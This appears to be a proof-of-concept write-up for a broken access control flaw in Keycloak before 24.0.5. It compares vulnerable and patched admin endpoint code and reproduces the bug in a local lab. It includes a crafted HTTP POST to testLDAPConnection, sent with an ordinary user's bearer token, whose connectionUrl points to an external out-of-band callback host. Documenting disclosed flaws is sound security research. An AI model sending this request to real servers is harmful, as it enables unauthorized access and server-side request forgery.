Keycloak < 24.0.5 is vulnerable to Broken Access Control  vulnerability, where the attacker can use any authenticated user to perform some api action such as :

Test LDAP connections via the **testLDAPConnection** endpoint.
Retrieve unmanaged attributes of any user via the **getUnmanagedAttributes** endpoint.
Access client registration policy providers via the **getProviders** endpoint.


I only found testLDAPConnection interesting where an attacker can interact with LDAP to an external host .

steps of reproduction
===================

first download the vulnerable version of KeyCloak 24.0.4 from here https://www.keycloak.org/archive/downloads-24.0.4.html

then extract the Zip file and run the command `bin/kc.sh start-dev`

![image](https://github.com/user-attachments/assets/ba375259-32de-45ce-b40b-c083fc7e5236)

Now You will run it on localhost:8080, Create a new admin account then login to this admin account 

now create a New Realm for regular users, then create a user with user privilege in this realm 


![image](https://github.com/user-attachments/assets/9c46cc1b-8f09-4695-a488-a392f95caae1)


Based on the commit that fix the vulnerability "Missing auth checks in some admin endpoints" https://github.com/keycloak/keycloak/commit/d9f0c84b797525eac55914db5f81a8133ef5f9b1

we find that there are 3 files  that have been modified :

TestLdapConnectionResource.java
UserResource.java
ClientRegistrationPolicyResource.java

Analyzing the Code Change in TestLdapConnectionResource.java:

**(Vulnerable Code):**

```java
public Response testLDAPConnection(TestLdapConnectionRepresentation config) {
    try {
        LDAPServerCapabilitiesManager.testLDAP(config, session, realm);
        return Response.noContent().build();
    }
    // Exception handling...
}
```

 There was **no permission check**. Any authenticated user could call `testLDAPConnection` and perform LDAP tests, which is an administrative action.

**(Patched Code):**

```java
public Response testLDAPConnection(TestLdapConnectionRepresentation config) {
    auth.realm().requireManageRealm(); // Added permission check
    try {
        LDAPServerCapabilitiesManager.testLDAP(config, session, realm);
        return Response.noContent().build();
    }
    // Exception handling...
}
```

![image](https://github.com/user-attachments/assets/674babf0-6479-4cfa-9dbe-af5a398b81bc)



The line `auth.realm().requireManageRealm();` was added to check if the user has admin permissions (`manage_realm` role) in the realm.

This means any user with any Realm can send a requset to `/admin/realms/users/testLDAPConnection`


Now in a new browser Open the link http://localhost:8080/realms/users/protocol/openid-connect/auth?client_id=account-console

Log in with the user that you created, then grep the **authorization: Bearer <>**

send HTTP  requset to the vulnerable endpoint :

```http
POST /admin/realms/users/testLDAPConnection HTTP/1.1
Host: dzdz.me:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
authorization: Bearer <xxxx>
content-type: application/json
Content-Length: 265
Origin: http://dzdz.me:8080
Connection: close


{

    "action": "testConnection",
    "connectionUrl": "ldap://xxxxxxxxxxxxxxxxxxxxxxx.oastify.com",
    "bindDn": "cn=admin,dc=example,dc=com",
    "bindCredential": "password",
    "useTruststoreSpi": "ldapsOnly",
    "connectionTimeout": "5000"
}
```

in the parameter `connectionUrl` put Your external host and send the Requset,

then You will receive the DNS interaction 


![image](https://github.com/user-attachments/assets/36a8ffe1-e0b3-4c9b-a063-37dc34bdca51)

you can apply the same thing with getUnmanagedAttributes and getProviders.


reference:
https://github.com/keycloak/keycloak/commit/d9f0c84b797525eac55914db5f81a8133ef5f9b1
https://github.com/advisories/GHSA-2cww-fgmg-4jqc


